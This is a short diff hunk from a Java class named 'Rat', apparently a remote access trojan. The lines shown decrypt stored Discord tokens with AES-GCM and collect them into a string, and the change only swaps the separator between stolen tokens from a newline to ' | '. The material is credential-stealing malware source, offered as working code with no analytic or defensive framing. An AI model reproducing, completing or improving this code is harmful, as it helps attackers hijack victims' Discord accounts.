@@ -125,7 +125,7 @@ public class Rat { //change class name please for the love of god
                                 Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                                 cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
                                 byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));
-                                discord += new String(out, StandardCharsets.UTF_8) + "\\n";
+                                discord += new String(out, StandardCharsets.UTF_8) + " | ";
                             }
                         }
                     }
